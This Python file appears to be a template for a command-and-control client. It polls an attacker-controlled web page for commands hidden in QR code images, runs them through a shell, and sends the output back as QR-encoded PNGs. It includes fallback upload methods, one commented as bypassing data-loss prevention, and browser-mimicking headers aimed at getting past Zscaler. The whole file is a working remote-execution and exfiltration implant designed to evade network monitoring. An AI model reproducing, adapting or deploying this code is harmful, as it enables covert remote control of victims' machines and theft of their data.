import requests
import subprocess
import time
from PIL import Image
from io import BytesIO
import qrcode
import pyzbar.pyzbar as pyzbar
import re
import base64
import urllib3

# Suppress SSL warnings when using self-signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Create a persistent session for better connection handling
session = requests.Session()

ATTACKER_IP = "{attacker_ip}"
PORT = {port}
PROTOCOL = "{protocol}"  # http or https
PORT_STR = "{port_str}"  # :8080 or empty for default ports
POLL_INTERVAL = 3
CHUNK_SIZE = 1000  
last_command_hash = None
VERIFY_SSL = False  # Set to False for self-signed certificates, True for valid certs

def encode_to_qr(data):
    qr = qrcode.QRCode(error_correction=qrcode.constants.ERROR_CORRECT_L)
    qr.add_data(data)
    qr.make(fit=True)
    return qr.make_image(fill="black", back_color="white")

def decode_qr_from_base64(base64_data):
    """Decode QR code from base64 string"""
    try:
        # Remove data URL prefix if present
        if ',' in base64_data:
            base64_data = base64_data.split(',')[1]
        
        # Decode base64 to image bytes
        image_bytes = base64.b64decode(base64_data)
        img = Image.open(BytesIO(image_bytes))
        decoded = pyzbar.decode(img)
        if decoded:
            return decoded[0].data.decode("utf-8")
    except Exception as e:
        return None

def decode_qr(image_data):
    """Decode QR code from image bytes (for backward compatibility)"""
    try:
        img = Image.open(BytesIO(image_data))
        decoded = pyzbar.decode(img)
        if decoded:
            return decoded[0].data.decode("utf-8")
    except Exception:
        return None

def extract_qr_from_html(html_content):
    """Extract base64 QR code data from HTML"""
    try:
        # Look for base64 data URL in img src attribute
        pattern = r'src="data:image/png;base64,([^"]+)"'
        match = re.search(pattern, html_content)
        if match:
            return match.group(1)
        return None
    except Exception:
        return None

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout or result.stderr
    except Exception as e:
        return f"Error: {e}"

def send_output(output, result_index, max_retries=3):
    """Send output back to server with retry logic and multiple fallback methods"""
    chunks = [output[i:i + CHUNK_SIZE] for i in range(0, len(output), CHUNK_SIZE)]
    
    for idx, chunk in enumerate(chunks):
        qr_output = encode_to_qr(chunk)
        buffer = BytesIO()
        qr_output.save(buffer, format="PNG")
        image_data = buffer.getvalue()
        result_url = f"{PROTOCOL}://{ATTACKER_IP}{PORT_STR}/result{result_index}_{idx}.png"
        
        # Method 1: Try POST with image/png content type
        success = False
        for attempt in range(max_retries):
            try:
                response = session.post(
                    result_url,
                    data=image_data,
                    headers={"Content-Type": "image/png"},
                    verify=VERIFY_SSL,
                    timeout=15,
                    allow_redirects=True
                )
                if response.status_code == 200:
                    success = True
                    if idx == 0:  # Only print once per result
                        print(f"[+] Result chunk {idx+1}/{len(chunks)} sent successfully")
                    break
                else:
                    print(f"[-] POST returned status {response.status_code}, attempt {attempt+1}/{max_retries}")
            except requests.exceptions.SSLError as e:
                print(f"[-] SSL Error (attempt {attempt+1}/{max_retries}): {e}")
                if attempt < max_retries - 1:
                    time.sleep(1 * (attempt + 1))  # Exponential backoff
            except requests.exceptions.ConnectionError as e:
                print(f"[-] Connection Error (attempt {attempt+1}/{max_retries}): {e}")
                if attempt < max_retries - 1:
                    time.sleep(1 * (attempt + 1))
            except requests.exceptions.Timeout:
                print(f"[-] Timeout (attempt {attempt+1}/{max_retries})")
                if attempt < max_retries - 1:
                    time.sleep(1 * (attempt + 1))
            except Exception as e:
                print(f"[-] Error sending result (attempt {attempt+1}/{max_retries}): {type(e).__name__}: {e}")
                if attempt < max_retries - 1:
                    time.sleep(1 * (attempt + 1))
        
        # Method 2: If POST failed, try POST with multipart/form-data (bypasses some DLP)
        if not success:
            try:
                files = {'file': ('result.png', image_data, 'image/png')}
                response = session.post(
                    result_url,
                    files=files,
                    verify=VERIFY_SSL,
                    timeout=15,
                    allow_redirects=True
                )
                if response.status_code == 200:
                    success = True
                    print(f"[+] Result chunk {idx+1}/{len(chunks)} sent via multipart")
            except Exception as e:
                print(f"[-] Multipart POST also failed: {type(e).__name__}: {e}")
        
        # Method 3: If still failed, try GET with base64 in query (for small chunks only)
        if not success and len(image_data) < 2000:  # Only for small chunks (URL length limit)
            try:
                b64_data = base64.b64encode(image_data).decode('utf-8')
                get_url = f"{result_url}?data={b64_data}"
                response = session.get(
                    get_url,
                    verify=VERIFY_SSL,
                    timeout=15,
                    allow_redirects=True
                )
                if response.status_code == 200:
                    success = True
                    print(f"[+] Result chunk {idx+1}/{len(chunks)} sent via GET fallback")
            except Exception as e:
                print(f"[-] GET fallback also failed: {type(e).__name__}: {e}")
        
        if not success:
            print(f"[-] Failed to send result chunk {idx+1}/{len(chunks)} after all methods")
        
        # Small delay between chunks to avoid overwhelming the connection
        if idx < len(chunks) - 1:
            time.sleep(0.5)

def main():
    global last_command_hash
    result_index = 0
    error_count = 0

    print(f"[+] Starting client...")
    print(f"[+] Connecting to: {PROTOCOL}://{ATTACKER_IP}{PORT_STR}/web.html")
    print(f"[+] SSL Verification: {VERIFY_SSL}")
    print(f"[!] Using persistent session for better connection handling")
    
    # Configure session for better Zscaler compatibility
    session.verify = VERIFY_SSL
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
    })
    
    while True:
        try:
            # Fetch web.html instead of PNG files
            url = f"{PROTOCOL}://{ATTACKER_IP}{PORT_STR}/web.html"
            response = session.get(url, timeout=5)
            
            if response.status_code == 200:
                html_content = response.text
                
                # Extract base64 QR code from HTML
                qr_base64 = extract_qr_from_html(html_content)
                
                if qr_base64:
                    # Check if this is a new command (by comparing hash)
                    current_hash = hash(qr_base64)
                    if current_hash != last_command_hash:
                        # Decode the QR code
                        command = decode_qr_from_base64(qr_base64)
                        
                        if command and command != "WAITING_FOR_COMMAND":
                            print(f"[+] Received command: {command}")
                            output = execute_command(command)
                            send_output(output, result_index)
                            result_index += 1
                            last_command_hash = current_hash
                            error_count = 0  # Reset error count on success
                        elif command == "WAITING_FOR_COMMAND":
                            # Just update hash to avoid re-processing, but don't execute
                            last_command_hash = current_hash
                            if error_count == 0:  # Only print once
                                print("[*] Waiting for commands...")
                            error_count = 0
                        else:
                            print("[-] Failed to decode QR code from HTML")
                    # If same hash, command already processed, just wait
                else:
                    print("[-] No QR code found in HTML")
            else:
                print(f"[-] HTTP Error: {response.status_code}")
                error_count += 1
            
            time.sleep(POLL_INTERVAL)
        except requests.exceptions.SSLError as e:
            error_count += 1
            if error_count <= 3:  # Only print first few times
                print(f"[-] SSL Error: {e}")
                print(f"[-] If using self-signed certificate, set VERIFY_SSL = False in demo.py")
            time.sleep(POLL_INTERVAL)
        except requests.exceptions.ConnectionError as e:
            error_count += 1
            if error_count <= 3:  # Only print first few times
                print(f"[-] Connection Error: Cannot connect to {url}")
                print(f"[-] Check if server is running and Apache is configured")
            time.sleep(POLL_INTERVAL)
        except requests.exceptions.Timeout as e:
            error_count += 1
            if error_count <= 3:
                print(f"[-] Timeout: Server did not respond")
            time.sleep(POLL_INTERVAL)
        except Exception as e:
            error_count += 1
            if error_count <= 3:
                print(f"[-] Error: {e}")
            time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    try:
        main()
    except:
        pass 
